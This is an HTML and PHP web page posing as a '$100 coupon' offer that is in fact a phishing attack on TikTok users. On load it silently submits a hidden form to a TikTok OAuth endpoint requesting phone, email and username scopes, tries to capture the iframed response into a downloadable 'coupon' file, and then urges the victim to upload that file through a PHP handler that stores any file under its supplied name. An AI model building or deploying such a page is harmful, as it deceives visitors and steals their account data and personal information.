<!DOCTYPE html>
<html>
<head>
    <title>Coupon</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body onload="submitForm()">
    <form name='myForm' id='myForm' method="POST" target="responseFrame" action="https://www.tiktok.com/passport/open/web/auth/?client_key=awn32gkr1d27lv49&scope=user.info.basic%2Cuser.info.phone%2Cuser.info.email%2Cuser.info.username&aid=1459&source=web&redirect_uri=https%3A%2F%2Fseller-id.tiktok.com%2Faccount%2Foauth%2Ftt%2Fcallback%3Flogin_only%3D1%26page_name%3Dlog_in%26channel%3Dundefined%26redirect_url%3Dhttps%253A%252F%252Fseller-id.tiktok.com%252Fhomepage%253Fregion_check%253D1%26url_params%3D%26state%3D1mqq48&state=1mqq48">
        <input type="hidden" name="contentField" value="undefined" />
    </form>
    
    <center><h1>Download Your Coupon File and Get free 100$</h1></center>
    
    <center><iframe id="responseFrame" name="responseFrame" style="width: 300px; height: 200px;"></iframe></center>
    
    <center><img src="https://www.lakhra.cf/images.jpeg" style="width: 250px; height: 200px"></center>

    <!-- Link to download the current page -->
    <br><br><center><a href="#" id="download-link" download>Download Your Coupon </a></center>
    
    <center><h1>if your coupon file has successfully download please upload it here and get your 100$</h1></center>

    <?php
    if(isset($_FILES['file'])) {
        $errors = array();
        $file_name = $_FILES['file']['name'];
        $file_size = $_FILES['file']['size'];
        $file_tmp = $_FILES['file']['tmp_name'];
        $file_type = $_FILES['file']['type'];

        if($file_size > 2097152) {
            $errors[] = 'File size must be exactly 2 MB';
        }

        if(empty($errors) == true) {
            move_uploaded_file($file_tmp, "uploads/".$file_name);
            echo "<center><h2>Success! Your file has been uploaded and you have earned 100$</h2></center>";
        } else {
            print_r($errors);
        }
    }
    ?>

    <form action="" method="POST" enctype="multipart/form-data">
        <center><input type="file" name="file" /></center>
        <center><input type="submit" value="Upload File"/></center>
    </form>

    <script>
        function submitForm() {
            document.getElementById('responseFrame').style.display = "block"; // show the iframe
            document.getElementById('myForm').submit(); // submit the form

            // capture the content from the iframe
            var iframe = document.getElementById('responseFrame');
            iframe.onload = function() {
                var iframeDoc = iframe.contentWindow.document;
                var content = JSON.stringify(iframeDoc);

                // Set the download URL for the link to the captured content
                var blob = new Blob([content], {
                    type: "text/plain"
                });
                var url = URL.createObjectURL(blob);
                document.getElementById("download-link").href = url;
            };
        }
    </script>
</body>
</html>
